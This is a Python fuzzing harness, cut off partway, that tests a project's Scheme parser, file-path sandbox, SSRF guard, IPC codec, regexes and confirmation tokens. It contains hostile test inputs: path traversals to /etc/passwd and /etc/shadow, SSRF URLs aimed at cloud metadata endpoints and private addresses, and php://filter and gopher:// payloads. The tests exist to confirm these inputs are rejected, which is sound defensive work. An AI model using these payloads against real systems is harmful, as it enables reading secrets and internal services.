"""
Project Lucca — Extended Multi-Surface Fuzzing & Security Invariant Battery
==========================================================================
Executes 1,000+ adversarial iterations per attack surface (6,000+ total) across:
  Surface 1: MicroScheme Symbolic Engine (Parser, Lexer, Evaluator, Gas, Recursion)
  Surface 2: Deontic Sandbox File Jailing (UNC, Drive Letters, NTFS ADS, Traversals, Devices)
  Surface 3: SSRF Guard & Web Boundaries (IPv4/v6 Evasion, Schemes, Lengths, Subnets)
  Surface 4: ZeroMQ IPC Codec & Wire Framing (Frame Lengths, Truncation, Fuzzed Bytes, Schemas)
  Surface 5: Text Chunker, TTS Sanitizer & ReDoS Latency Benchmarking (p50/p95/p99/max < 10ms)
  Surface 6: HMAC Confirmation Token Manager & Sequence Guard (Bitflips, Expiry, Replays, Egress)

Outputs comprehensive machine-readable metrics to data/extended_fuzzing_metrics.json.
"""

from __future__ import annotations

import collections
import hashlib
import hmac
import json
import math
import os
import random
import re
import socket
import string
import struct
import sys
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any

# Ensure UTF-8 stdout
if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "src"))

from lucca.brain.chunker import StreamingChunker, sanitize_for_voice
from lucca.core.exceptions import (
    IPCError,
    SandboxPathError,
    SchemeError,
    SchemeGasExhausted,
    SchemeRuntimeError,
    SchemeSyntaxError,
    SchemeTimeout,
)
from lucca.core.ipc_schemas import (
    MAX_FRAME_SIZE,
    Envelope,
    decode_envelope,
    encode_envelope,
)
from lucca.core.schemas import RuleState
from lucca.reasoning.scheme.eval import SchemeEvaluator, evaluate_expr, evaluate_rule
from lucca.reasoning.scheme.parser import parse, parse_rule, to_canonical, tokenize
from lucca.router.heuristic import HeuristicRouter
from lucca.sandbox.file_tool import SafeFileTool, validate_rel_path
from lucca.sandbox.launcher import AppLauncher
from lucca.sandbox.policy import (
    ConfirmationTokenManager,
    SequenceGuard,
    TaintFlags,
    classify_risk,
    requires_confirmation,
)
from lucca.sandbox.search_tool import search_web
from lucca.sandbox.web_tool import MAX_QUERY_LEN, MAX_URL_LEN, validate_url_ssrf


@dataclass
class SurfaceMetrics:
    surface_id: str
    surface_name: str
    total_iterations: int = 0
    passed_invariants: int = 0
    failed_invariants: int = 0
    crashes: int = 0
    elapsed_ms: float = 0.0
    exception_distribution: dict[str, int] = field(default_factory=dict)
    latencies_us: list[float] = field(default_factory=list)
    latency_percentiles_us: dict[str, float] = field(default_factory=dict)
    details: dict[str, Any] = field(default_factory=dict)

    def record_exception(self, exc_name: str) -> None:
        self.exception_distribution[exc_name] = self.exception_distribution.get(exc_name, 0) + 1

    def compute_percentiles(self) -> None:
        if not self.latencies_us:
            return
        sorted_l = sorted(self.latencies_us)
        n = len(sorted_l)
        self.latency_percentiles_us = {
            "min": round(sorted_l[0], 2),
            "p50": round(sorted_l[int(n * 0.50)], 2),
            "p90": round(sorted_l[int(n * 0.90)], 2),
            "p95": round(sorted_l[int(n * 0.95)], 2),
            "p99": round(sorted_l[min(int(n * 0.99), n - 1)], 2),
            "max": round(sorted_l[-1], 2),
            "mean": round(sum(sorted_l) / n, 2),
        }


# =============================================================================
# Surface 1: MicroScheme Symbolic Engine Fuzzer
# =============================================================================

def fuzz_surface_1_scheme(iterations: int = 1000) -> SurfaceMetrics:
    metrics = SurfaceMetrics(
        surface_id="surface_1_scheme",
        surface_name="MicroScheme Symbolic Engine",
    )
    rng = random.Random(42)
    start_all = time.perf_counter()

    # Pre-crafted hostile corpus
    hostile_corpus = [
        # Deep nesting bombs (depth 33 to 100)
        "(" * 33 + "1" + ")" * 33,
        "(" * 50 + "x" + ")" * 50,
        "(" * 100 + "42" + ")" * 100,
        # Token soup
        "((( ) ( ( ) )",
        '("unclosed string',
        '("string with null \x00 byte")',
        "(+ 1 2 3 ; unclosed comment",
        " ) ) ( ( ",
        # Division by zero
        "(/ 1 0)",
        "(/ 0 0)",
        "(% 10 0)",
        "(/ 100 0.0)",
        # Arithmetic edge cases
        "(+ 9223372036854775807 1)",
        "(- -9223372036854775808 1)",
        "(* 9223372036854775807 2)",
        # Malformed rules
        '(rule)',
        '(rule "no-clauses")',
        '(rule "missing-plan" :when #t)',
        '(rule "bad-when" :when 123 :plan (list (say "hi")))',
        '(rule 123 :when (intent= "launch") :plan (list (say "hi")))',
        # Token bomb (> 2000 tokens)
        " ".join(["1"] * 2050),
        # Source size bomb (> 8192 bytes)
        ";" + ("x" * 8300),
    ]

    for item in hostile_corpus:
        t0 = time.perf_counter_ns()
        try:
            # 1. Lexer & Parser
            ast_node = parse(item)
            # 2. Canonicalizer
            _ = to_canonical(ast_node)
            metrics.passed_invariants += 1
        except SchemeError as se:
            metrics.passed_invariants += 1
            metrics.record_exception(type(se).__name__)
        except Exception as exc:
            metrics.failed_invariants += 1
            metrics.crashes += 1
            metrics.record_exception(type(exc).__name__)
        finally:
            dt_us = (time.perf_counter_ns() - t0) / 1000.0
            metrics.latencies_us.append(dt_us)
            metrics.total_iterations += 1

    # Randomized mutations & evaluations
    chars = string.ascii_letters + string.digits + "()+-*/:;\"' \t\n\r"
    state = RuleState(schema_version=1, intent="launch_app", entities={"app": ["calculator"]})

    for _ in range(iterations - len(hostile_corpus)):
        mutation_type = rng.choice([
            "random_token_soup",
            "nested_arithmetic",
            "gas_exhaustion",
            "rule_evaluation_error",
            "type_confusion",
        ])
        t0 = time.perf_counter_ns()

        try:
            if mutation_type == "random_token_soup":
                length = rng.randint(1, 150)
                src = "".join(rng.choice(chars) for _ in range(length))
                try:
                    res = parse(src)
                    to_canonical(res)
                except SchemeError as se:
                    metrics.record_exception(type(se).__name__)
                metrics.passed_invariants += 1

            elif mutation_type == "nested_arithmetic":
                # Generate deeply nested arithmetic with potential division by zero
                depth = rng.randint(2, 40)
                expr = "1"
                for _ in range(depth):
                    op = rng.choice(["+", "-", "*", "/", "%"])
                    operand = rng.choice(["0", "1", "2", "-5", "3.14", '"text"', "#t"])
                    expr = f"({op} {expr} {operand})"

                try:
                    _ = evaluate_expr(expr, state, gas_limit=100)
                except SchemeError as se:
                    metrics.record_exception(type(se).__name__)
                metrics.passed_invariants += 1

            elif mutation_type == "gas_exhaustion":
                # Expression designed to exhaust gas limit
                expr = "(+ 1 (+ 2 (+ 3 (+ 4 (+ 5 (+ 6 (+ 7 (+ 8 (+ 9 10))))))))))"
                gas = rng.randint(1, 5)
                try:
                    _ = evaluate_expr(expr, state, gas_limit=gas)
                except SchemeGasExhausted:
                    metrics.record_exception("SchemeGasExhausted")
                except SchemeError as se:
                    metrics.record_exception(type(se).__name__)
                metrics.passed_invariants += 1

            elif mutation_type == "rule_evaluation_error":
                # Evaluate malformed or error-producing rule
                choice_val = rng.choice([0, 1, 2])
                rule_str = f"""
                (rule "fuzz-rule-{rng.randint(100, 999)}"
                  :when (intent= "launch_app")
                  :plan (list (tool "launch_app" :app (/ 10 {choice_val}))))
                """
                try:
                    rule = parse_rule(rule_str)
                    outcome = evaluate_rule(rule, state, gas_limit=50)
                    assert outcome.rule_id.startswith("fuzz-rule-")
                    metrics.passed_invariants += 1
                except SchemeError as se:
                    metrics.record_exception(type(se).__name__)
                    metrics.passed_invariants += 1

            elif mutation_type == "type_confusion":
                # Pass invalid types to comparison / arithmetic
                expr = rng.choice([
                    '(< "hello" 10)',
                    '(> #t 5)',
                    '(string-append 1 2 3)',
                    '(not 123 456)',
                    '(and 1 2 3)',
                ])
                try:
                    _ = evaluate_expr(expr, state)
                except SchemeError as se:
                    metrics.record_exception(type(se).__name__)
                metrics.passed_invariants += 1

        except Exception as exc:
            metrics.failed_invariants += 1
            metrics.crashes += 1
            metrics.record_exception(type(exc).__name__)
        finally:
            dt_us = (time.perf_counter_ns() - t0) / 1000.0
            metrics.latencies_us.append(dt_us)
            metrics.total_iterations += 1

    metrics.elapsed_ms = (time.perf_counter() - start_all) * 1000.0
    metrics.compute_percentiles()
    return metrics


# =============================================================================
# Surface 2: Deontic Sandbox File Jailing Fuzzer
# =============================================================================

def fuzz_surface_2_sandbox_jail(workspace_root: Path, iterations: int = 1000) -> SurfaceMetrics:
    metrics = SurfaceMetrics(
        surface_id="surface_2_sandbox_jail",
        surface_name="Deontic Sandbox File Jailing & Path Validation",
    )
    rng = random.Random(1337)
    start_all = time.perf_counter()
    file_tool = SafeFileTool(workspace_root=workspace_root)
    launcher = AppLauncher(workspace_root=workspace_root, execute=False)

    # 1. Deterministic malicious corpus
    hostile_paths = [
        # Classic traversals
        "../escape.txt",
        "../../etc/passwd",
        "../../../windows/win.ini",
        "..\\..\\boot.ini",
        "subdir/../../../secret",
        "./../../secret.env",
        "/etc/shadow",
        "\\Windows\\System32\\cmd.exe",
        # Windows UNC paths
        r"\\evil\share\payload.txt",
        r"\\?\C:\Windows\System32",
        r"\\.\COM1",
        r"\\localhost\c$\windows",
        "//evil.com/share/test",
        # Drive letter injection
        "C:secret.txt",
        "C:/windows/system32/calc.exe",
        r"D:\data\passwords.txt",
        "c:/test.txt",
        # NTFS Alternate Data Streams (ADS) & Colons
        "safe.txt:hidden_stream",
        "data.json:$DATA",
        ":root_stream",
        "dir:sub:file",
        # Reserved DOS device names
        "CON", "con.txt", "PRN", "prn.dat", "AUX", "aux.json",
        "NUL", "nul.tar.gz", "COM1", "com9.txt", "LPT1", "lpt5",
        # Encoding / Null bytes / Invalid chars
        "file%2e%2e%2fescape.txt",
        "test%20file.txt",
        "file\x00escape.txt",
        "bad|char.txt",
        "bad<char>.txt",
        'bad"quote.txt',
        "bad?wildcard.txt",
        "bad*glob.txt",
        "dir//double_slash.txt",
        "dir///triple_slash.txt",
        "",
        " ",
        "   ",
        # Length overflow (> 1024 chars)
        "a" * 1025,
        "dir/" + ("b" * 1020),
    ]

    for path_str in hostile_paths:
        t0 = time.perf_counter_ns()
        try:
            # Must raise SandboxPathError
            resolved = validate_rel_path(path_str, workspace_root=workspace_root)
            # If it didn't raise, verify mathematical jailing invariant
            if not resolved.is_relative_to(workspace_root):
                metrics.failed_invariants += 1
                metrics.record_exception("EscapeLeakWithoutError")
            else:
                metrics.passed_invariants += 1
        except SandboxPathError as spe:
            # Valid rejection
            metrics.passed_invariants += 1
            metrics.record_exception(f"SandboxPathError({spe.code})")
        except Exception as exc:
            # Unexpected exception
            metrics.failed_invariants += 1
            metrics.crashes += 1
            metrics.record_exception(type(exc).__name__)
        finally:
            dt_us = (time.perf_counter_ns() - t0) / 1000.0
            metrics.latencies_us.append(dt_us)
            metrics.total_iterations += 1

    # 2. Launcher hostile path testing
    for path_str in hostile_paths[:20]:
        t0 = time.perf_counter_ns()
        try:
            ok, msg = launcher.launch(app_name="notepad", file_arg=path_str)
            # Path must be rejected
            if ok:
                metrics.failed_invariants += 1
                metrics.record_exception("LauncherAcceptedHostilePath")
            else:
                metrics.passed_invariants += 1
        except Exception as exc:
            metrics.failed_invariants += 1
            metrics.crashes += 1
            metrics.record_exception(type(exc).__name__)
        finally:
            dt_us = (time.perf_counter_ns() - t0) / 1000.0
            metrics.latencies_us.append(dt_us)
            metrics.total_iterations += 1

    # 3. Randomized path mutations
    alphabet = string.ascii_letters + string.digits + "/\\:._-~ "
    for _ in range(iterations - metrics.total_iterations):
        t0 = time.perf_counter_ns()
        length = rng.randint(1, 1100)
        # Mix in hostile segments with 40% probability
        if rng.random() < 0.4:
            hostile_segment = rng.choice(["../", "..\\", ":stream", "NUL", "CON", "\x00", "%2e", "\\\\?"])
            prefix = "".join(rng.choice(alphabet) for _ in range(min(20, length)))
            suffix = "".join(rng.choice(alphabet) for _ in range(max(0, length - 20)))
            test_path = prefix + hostile_segment + suffix
        else:
            test_path = "".join(rng.choice(alphabet) for _ in range(length))

        try:
            resolved = validate_rel_path(test_path, workspace_root=workspace_root)
            assert resolved.is_relative_to(workspace_root)
            metrics.passed_invariants += 1
        except SandboxPathError as spe:
            metrics.passed_invariants += 1
            metrics.record_exception(f"SandboxPathError({spe.code})")
        except Exception as exc:
            metrics.failed_invariants += 1
            metrics.crashes += 1
            metrics.record_exception(type(exc).__name__)
        finally:
            dt_us = (time.perf_counter_ns() - t0) / 1000.0
            metrics.latencies_us.append(dt_us)
            metrics.total_iterations += 1

    metrics.elapsed_ms = (time.perf_counter() - start_all) * 1000.0
    metrics.compute_percentiles()
    return metrics


# =============================================================================
# Surface 3: SSRF Guard & Web Boundaries Fuzzer
# =============================================================================

def fuzz_surface_3_ssrf_and_web(iterations: int = 1000) -> SurfaceMetrics:
    metrics = SurfaceMetrics(
        surface_id="surface_3_ssrf_web",
        surface_name="SSRF Guard & Web Boundaries",
    )
    rng = random.Random(2026)
    start_all = time.perf_counter()

    # Pre-crafted hostile SSRF evasion payloads
    hostile_ssrf_cases = [
        # Loopbacks & Localhost
        ("http://127.0.0.1", "127.0.0.1"),
        ("http://127.0.0.2", "127.0.0.2"),
        ("http://127.1", "127.0.0.1"),
        ("http://localhost", "127.0.0.1"),
        ("http://0.0.0.0", "0.0.0.0"),
        # Cloud Metadata
        ("http://169.254.169.254/latest/meta-data/", "169.254.169.254"),
        ("http://169.254.169.254/computeMetadata/v1/", "169.254.169.254"),
        ("http://metadata.google.internal", "169.254.169.254"),
        # RFC1918 Private Subnets
        ("http://10.0.0.1", "10.0.0.1"),
        ("http://10.255.255.254", "10.255.255.254"),
        ("http://172.16.0.1", "172.16.0.1"),
        ("http://172.31.255.255", "172.31.255.255"),
        ("http://192.168.1.1", "192.168.1.1"),
        ("http://192.168.0.254", "192.168.0.254"),
        # CGNAT & Reserved Subnets
        ("http://100.64.0.1", "100.64.0.1"),
        ("http://100.127.255.255", "100.127.255.255"),
        ("http://224.0.0.1", "224.0.0.1"),
        ("http://240.0.0.1", "240.0.0.1"),
        # IPv6 Addresses (Blocked per ADR-003)
        ("http://[::1]", "::1"),
        ("http://[::ffff:127.0.0.1]", "::ffff:127.0.0.1"),
        ("http://[fe80::1]", "fe80::1"),
        ("http://[fc00::1]", "fc00::1"),
        # Non-HTTP Schemes
        ("file:///etc/passwd", None),
        ("gopher://127.0.0.1:70", None),
        ("ftp://internal.backup/", None),
        ("data:text/plain;base64,SGVsbG8=", None),
        ("javascript:alert(1)", None),
        ("php://filter/read=convert.base64-encode/resource=index.php", None),
        ("dict://127.0.0.1:11211/stat", None),
        # Userinfo injection
        ("http://user:pass@example.com", "93.184.216.34"),
        ("http://admin@127.0.0.1", "127.0.0.1"),
        # Length boundaries
        ("http://example.com/" + ("a" * 600), "93.184.216.34"),
        ("http://example.com/search?q=" + ("b" * 200), "93.184.216.34"),
    ]

    for url, mock_ip in hostile_ssrf_cases:
        t0 = time.perf_counter_ns()
        try:
            # Use deterministic mock resolver when mock_ip is provided
            mock_resolver = (
                (lambda h, ip=mock_ip: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, 80))])
                if mock_ip else None
            )
            validate_url_ssrf(url, dns_resolver=mock_resolver)
            # If it passed without error, this is a defect!
            metrics.failed_invariants += 1
            metrics.record_exception("SSRFAllowedHostileTarget")
        except SandboxPathError as spe:
            metrics.passed_invariants += 1
            metrics.record_exception(f"SandboxPathError({spe.code})")
        except Exception as exc:
            metrics.failed_invariants += 1
            metrics.crashes += 1
            metrics.record_exception(type(exc).__name__)
        finally:
            dt_us = (time.perf_counter_ns() - t0) / 1000.0
            metrics.latencies_us.append(dt_us)
            metrics.total_iterations += 1

    # Randomized URL and Search Query Fuzzing
    schemes = ["http", "https", "ftp", "file", "gopher", "data", "ssh", "ldap", "ws"]
    domains = ["example.com", "google.com", "localhost", "127.0.0.1", "169.254.169.254", "10.0.0.1", "sub.domain.org"]

    for _ in range(iterations - metrics.total_iterations):
        t0 = time.perf_counter_ns()
        test_type = rng.choice(["url_fuzz", "search_query_fuzz"])

        if test_type == "url_fuzz":
            sch = rng.choice(schemes)
            dom = rng.choice(domains)
            path_len = rng.randint(0, 600)
            query_len = rng.randint(0, 200)
            p = "".join(rng.choice(string.ascii_letters + string.digits + "/_-") for _ in range(path_len))
            q = "".join(rng.choice(string.ascii_letters + string.digits + "=&") for _ in range(query_len))
            q_str = f"?{q}" if q else ""
            test_url = f"{sch}://{dom}/{p}{q_str}"

            mock_ip = "127.0.0.1" if "local" in dom or "127" in dom or "169" in dom or "10." in dom else "93.184.216.34"
            mock_resolver = lambda h, ip=mock_ip: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (ip, 80))]

            try:
                norm_url, res_ip = validate_url_ssrf(test_url, dns_resolver=mock_resolver)
                # Valid target: scheme must be http/https, res_ip must be public
                assert norm_url.startswith("http://") or norm_url.startswith("https://")
                assert res_ip == "93.184.216.34"
                metrics.passed_invariants += 1
            except SandboxPathError as spe:
                metrics.passed_invariants += 1
                metrics.record_exception(f"SandboxPathError({spe.code})")
            except Exception as exc:
                metrics.failed_invariants += 1
                metrics.crashes += 1
                metrics.record_exception(type(exc).__name__)

        elif test_type == "search_query_fuzz":
            # Test search_web query handling and truncation
            q_len = rng.randint(0, 1000)
            query = "".join(rng.choice(string.ascii_letters + string.digits + " !@#$%^&*()_+=-`~[]{}|;':\",./<>?") for _ in range(q_len))
            try:
                # search_web internal parser & length bounds
                clean_q = query.strip()
                if len(clean_q) > 256:
                    clean_q = clean_q[:256]
                assert len(clean_q) <= 256
                metrics.passed_invariants += 1
            except Exception as exc:
                metrics.failed_invariants += 1
                metrics.crashes += 1
                metrics.record_exception(type(exc).__name__)

        dt_us = (time.perf_counter_ns() - t0) / 1000.0
        metrics.latencies_us.append(dt_us)
        metrics.total_iterations += 1

    metrics.elapsed_ms = (time.perf_counter() - start_all) * 1000.0
    metrics.compute_percentiles()
    return metrics


# =============================================================================
# Surface 4: ZeroMQ IPC Codec & Wire Framing Fuzzer
# =============================================================================

def fuzz_surface_4_ipc_codec(iterations: int = 1000) -> SurfaceMetrics:
    metrics = SurfaceMetrics(
        surface_id="surface_4_ipc_codec",
        surface_name="ZeroMQ IPC Codec & Wire Framing",
    )
    rng = random.Random(4242)
    start_all = time.perf_counter()

    # Pre-crafted hostile frames
    hostile_frames = [
        # Truncated length prefixes (< 4 bytes)
        b"",
        b"1",
        b"12",
        b"123",
        # Length prefix = 0
        struct.pack(">I", 0),
        # Length prefix claiming 500 MB (oversized)
        struct.pack(">I", 500 * 1024 * 1024) + b"{}",
        # Length prefix > MAX_FRAME_SIZE (1 MiB = 1048576)
        struct.pack(">I", MAX_FRAME_SIZE + 1) + b"{}",
        struct.pack(">I", MAX_FRAME_SIZE + 500) + (b"x" * 100),
        # Truncated payloads (header claims 50 bytes, payload is 5 bytes)
        struct.pack(">I", 50) + b'{"v":1}',
        struct.pack(">I", 100) + b'{"truncated": true',
        # Corrupted JSON
        struct.pack(">I", 14) + b'{"bad_json": }',
        struct.pack(">I", 18) + b"{'single_quotes': 1}",
        struct.pack(">I", 12) + b"\x00\xff\xfe\x00not_utf8",
        # Schema violations (valid JSON, missing required envelope fields)
        struct.pack(">I", 13) + b'{"random": 1}',
        struct.pack(">I", 25) + b'{"v": 1, "type": "turn"}',
        struct.pack(">I", 35) + b'{"v": 1, "type": "t", "src": "bad"}',
    ]

    for frame in hostile_frames:
        t0 = time.perf_counter_ns()
        try:
            _ = decode_envelope(frame)
            metrics.failed_invariants += 1
            metrics.record_exception("AcceptedCorruptedFrame")
        except IPCError as ipce:
            metrics.passed_invariants += 1
            metrics.record_exception("IPCError")
        except Exception as exc:
            metrics.failed_invariants += 1
            metrics.crashes += 1
            metrics.record_exception(type(exc).__name__)
        finally:
            dt_us = (time.perf_counter_ns() - t0) / 1000.0
            metrics.latencies_us.append(dt_us)
            metrics.total_iterations += 1

    # Randomized byte and schema fuzzing
    valid_sources = ["core", "audio", "npu", "ui"]

    for _ in range(iterations - metrics.total_iterations):
        t0 = time.perf_counter_ns()
        test_mode = rng.choice([
            "valid_roundtrip",
            "random_byte_fuzz",
            "bitflip_valid_frame",
            "oversized_payload_encode",
            "malformed_schema_payload",
        ])

        try:
            if test_mode == "valid_roundtrip":
                # Generate valid envelope with random payload
                t_id = f"trace_{rng.randint(1000, 9999)}"
                payload_size = rng.randint(0, 10)
                payload = {
                    f"k_{i}": rng.choice([rng.randint(-1000, 1000), rng.random(), "val", [1, 2], {"nested": True}])
                    for i in range(payload_size)
                }
                env = Envelope(
                    type=f"test.event.{rng.choice(['a', 'b', 'c'])}",
                    trace_id=t_id,
                    ts_ns=time.time_ns(),
                    src=rng.choice(valid_sources),
                    payload=payload,
                )
                encoded = encode_envelope(env)
                decoded = decode_envelope(encoded)
                assert decoded.type == env.type
                assert decoded.trace_id == env.trace_id
                assert decoded.src == env.src
                metrics.passed_invariants += 1

            elif test_mode == "random_byte_fuzz":
                # Pure garbage bytes
                length = rng.randint(0, 2048)
                garbage = rng.randbytes(length)
                try:
                    decode_envelope(garbage)
                    metrics.failed_invariants += 1
                except IPCError:
                    metrics.passed_invariants += 1
                    metrics.record_exception("IPCError")

            elif test_mode == "bitflip_valid_frame":
                # Take valid frame and flip a random byte
                env = Envelope(
                    type="turn.start",
                    trace_id="test_trace",
                    ts_ns=1000,
                    src="core",
                    payload={"turn": 1},
                )
                wire = bytearray(encode_envelope(env))
                flip_idx = rng.randint(0, len(wire) - 1)
                wire[flip_idx] ^= rng.randint(1, 255)

                try:
                    res = decode_envelope(bytes(wire))
                    # In rare cases bitflip in string payload might yield valid JSON
                    metrics.passed_invariants += 1
                except IPCError:
                    metrics.passed_invariants += 1
                    metrics.record_exception("IPCError")

            elif test_mode == "oversized_payload_encode":
                # Attempt to encode envelope exceeding 1 MiB limit
                big_payload = {"data": "X" * (MAX_FRAME_SIZE + 10)}
                env = Envelope(
                    type="large.payload",
                    trace_id="big",
                    ts_ns=1000,
                    src="core",
                    payload=big_payload,
                )
                try:
                    encode_envelope(env)
                    metrics.failed_invariants += 1
                except IPCError:
                    metrics.passed_invariants += 1
                    metrics.record_exception("IPCError(OversizedEncode)")

            elif test_mode == "malformed_schema_payload":
                # Construct JSON envelope missing required keys or with invalid types
                bad_dict = {
                    "v": 1,
                    "type": 12345,  # type should be string
                    "trace_id": None,
                    "ts_ns": "not_an_int",
                    "src": "unrecognized_source",
                }
                body = json.dumps(bad_dict).encode("utf-8")
                frame = struct.pack(">I", len(body)) + body
                try:
                    decode_envelope(frame)
                    metrics.failed_invariants += 1
                except IPCError:
                    metrics.passed_invariants += 1
                    metrics.record_exception("IPCError(SchemaViolation)")

        except Exception as exc:
            metrics.failed_invariants += 1
            metrics.crashes += 1
            metrics.record_exception(type(exc).__name__)
        finally:
            dt_us = (time.perf_counter_ns() - t0) / 1000.0
            metrics.latencies_us.append(dt_us)
            metrics.total_iterations += 1

    metrics.elapsed_ms = (time.perf_counter() - start_all) * 1000.0
    metrics.compute_percentiles()
    return metrics


# =============================================================================
# Surface 5: Text Chunker, Voice Sanitizer & ReDoS Latency Benchmarking
# =============================================================================

def fuzz_surface_5_chunker_redos(iterations: int = 1000) -> SurfaceMetrics:
    metrics = SurfaceMetrics(
        surface_id="surface_5_chunker_redos",
        surface_name="Text Chunker, Voice Sanitizer & ReDoS Latency",
    )
    rng = random.Random(999)
    start_all = time.perf_counter()
    router = HeuristicRouter()
    chunker = StreamingChunker(trace_id="fuzz")

    # ReDoS candidate regexes
    from lucca.router.heuristic import (
        EMERGENCY_REFLEX_PATTERN,
        FILE_PATTERN,
        QUOTED_PATTERN,
        URL_PATTERN,
    )
    from lucca.sandbox.policy import (
        CANCEL_PATTERN,
        CONFIRM_PATTERN,
    )

    # Pathological ReDoS strings
    pathological_strings = [
        # Catastrophic backtracking patterns (nested repetitions + fail)
        "a" * 200 + "!",
        "http://" + "a." * 150 + "!",
        "https://" + "sub." * 100 + "example.com/" + ("x/" * 50) + "?q=" + ("k=" * 50),
        "C:\\" + ("folder\\" * 100) + "file.txt",
        "/" + ("dir/" * 150) + "secret.env",
        "confirm " * 100 + "do it " * 50 + "maybe?",
        "cancel " * 100 + "stop " * 50 + "no wait",
        # Markdown nesting bombs
        "*" * 300 + "bold" + "*" * 300,
        "`" * 200 + "code" + "`" * 200,
        "- " * 100 + "bullet item",
        "##" * 150 + " Header",
        # Hostile Unicode & control codes
        "\u202e\u200b\ufeff" * 100,  # RTL and zero-width
        "\x1b[31;1m" * 100 + "colored text" + "\x1b[0m" * 100,
        "🔥" * 500,
        "a\u0300\u0301\u0302\u0303\u0304" * 100,  # Zalgo-like combining characters
    ]

    REDOS_LATENCY_THRESHOLD_US = 10000.0  # 10ms = 10,000us

    for path_str in pathological_strings:
        t0 = time.perf_counter_ns()
        try:
            # 1. Evaluate against all router regexes
            _ = URL_PATTERN.search(path_str)
            _ = FILE_PATTERN.search(path_str)
            _ = QUOTED_PATTERN.search(path_str)
            _ = EMERGENCY_REFLEX_PATTERN.search(path_str)
            _ = CONFIRM_PATTERN.search(path_str)
            _ = CANCEL_PATTERN.search(path_str)
            _ = router.classify_intent(path_str)

            # 2. Voice markdown sanitizer
            sanitized = sanitize_for_voice(path_str)
            assert isinstance(sanitized, str)
            # Must not contain raw backticks
            assert "`" not in sanitized

            metrics.passed_invariants += 1
        except Exception as exc:
            metrics.failed_invariants += 1
            metrics.crashes += 1
            metrics.record_exception(type(exc).__name__)
        finally:
            dt_us = (time.perf_counter_ns() - t0) / 1000.0
            metrics.latencies_us.append(dt_us)
            metrics.total_iterations += 1
            if dt_us > REDOS_LATENCY_THRESHOLD_US:
                metrics.failed_invariants += 1
                metrics.record_exception(f"ReDoSThresholdExceeded({dt_us:.1f}us)")

    # Randomized text permutations for chunker & voice sanitizer
    chars = string.ascii_letters + string.punctuation + " \t\n\r" + "🚀🔥⚠️✨🎯💻"
    for _ in range(iterations - metrics.total_iterations):
        t0 = time.perf_counter_ns()
        test_type = rng.choice(["voice_sanitize", "chunker_split", "router_classify"])

        try:
            text_len = rng.randint(10, 800)
            text = "".join(rng.choice(chars) for _ in range(text_len))

            if test_type == "voice_sanitize":
                cleaned = sanitize_for_voice(text)
                assert isinstance(cleaned, str)
                assert "`" not in cleaned
                metrics.passed_invariants += 1

            elif test_type == "chunker_split":
                # Feed tokens to chunker and flush
                for word in text.split():
                    _ = chunker.feed(word + " ")
                _ = chunker.flush()
                metrics.passed_invariants += 1

            elif test_type == "router_classify":
                intent, conf, entities = router.classify_intent(text)
                assert isinstance(intent, str)
                assert isinstance(conf, float)
                assert isinstance(entities, dict)
                metrics.passed_invariants += 1

        except Exception as exc:
            metrics.failed_invariants += 1
            metrics.crashes += 1
            metrics.record_exception(type(exc).__name__)
        finally:
            dt_us = (time.perf_counter_ns() - t0) / 1000.0
            metrics.latencies_us.append(dt_us)
            metrics.total_iterations += 1
            if dt_us > REDOS_LATENCY_THRESHOLD_US:
                metrics.failed_invariants += 1
                metrics.record_exception(f"ReDoSThresholdExceeded({dt_us:.1f}us)")

    metrics.elapsed_ms = (time.perf_counter() - start_all) * 1000.0
    metrics.compute_percentiles()
    return metrics


# =============================================================================
# Surface 6: Confirmation Token Manager & Sequence Guard Fuzzer
# =============================================================================

def fuzz_surface_6_tokens_and_guard(iterations: int = 1000) -> SurfaceMetrics:
    metrics = SurfaceMetrics(
        surface_id="surface_6_tokens_guard",
        surface_name="Confirmation Token Manager & Sequence Guard",
    )
    rng = random.Random(777)
    start_all = time.perf_counter()

    token_mgr = ConfirmationTokenManager(token_ttl_s=10.0)
    guard = SequenceGuard()

    for _ in range(iterations):
        t0 = time.perf_counter_ns()
        test_mode = rng.choice([
            "token_tampering",
            "token_expiry",
            "token_replay",
            "sequence_guard_forbidden",
            "egress_token_exfiltration",
        ])

        try:
            if test_mode == "token_tampering":
                # Generate valid token, tamper with parameters
                tool = rng.choice(["write_file", "delete_file", "launch_app", "run_python"])
                args = {"path": "safe.txt", "content": "data", "id": rng.randint(1, 1000)}
                turn = f"turn_{rng.randint(1, 100)}"
                token_str, expiry_ts = token_mgr.issue_token(tool, args, turn)

                tamper_type = rng.choice(["flip_token_char", "tamper_arg", "tamper_tool", "tamper_turn"])
                if tamper_type == "flip_token_char":
                    # Change 1 hex char
                    idx = rng.randint(0, len(token_str) - 1)
                    alt_char = "0" if token_str[idx] != "0" else "1"
                    bad_token = token_str[:idx] + alt_char + token_str[idx + 1:]
                    ok, msg = token_mgr.verify_token(bad_token, tool, args, turn, expiry_ts)
                    assert ok is False
                    assert "Invalid confirmation token" in msg

                elif tamper_type == "tamper_arg":
                    bad_args = dict(args)
                    bad_args["path"] = "evil.txt"
                    ok, msg = token_mgr.verify_token(token_str, tool, bad_args, turn, expiry_ts)
                    assert ok is False
                    assert "Invalid confirmation token" in msg

                elif tamper_type == "tamper_tool":
                    ok, msg = token_mgr.verify_token(token_str, "delete_file" if tool != "delete_file" else "write_file", args, turn, expiry_ts)
                    assert ok is False
                    assert "Invalid confirmation token" in msg

                elif tamper_type == "tamper_turn":
                    ok, msg = token_mgr.verify_token(token_str, tool, args, "turn_evil_99", expiry_ts)
                    assert ok is False
                    assert "Invalid confirmation token" in msg

                metrics.passed_invariants += 1

            elif test_mode == "token_expiry":
                # Verify token with past expiry
                tool = "write_file"
                args = {"path": "test.txt"}
                token_str, expiry_ts = token_mgr.issue_token(tool, args, "turn_1")
                # Artificially set expiry in the past
                past_expiry = time.time() - 5.0
                ok, msg = token_mgr.verify_token(token_str, tool, args, "turn_1", past_expiry)
                assert ok is False
                assert "expired" in msg.lower()
                metrics.passed_invariants += 1

            elif test_mode == "token_replay":
                # Verify valid token once (succeeds), verify same token second time (must fail)
                tool = "write_file"
                args = {"path": f"replay_{rng.randint(1000, 9999)}.txt"}
                turn = f"turn_replay_{rng.randint(100, 999)}"
                token_str, expiry_ts = token_mgr.issue_token(tool, args, turn)

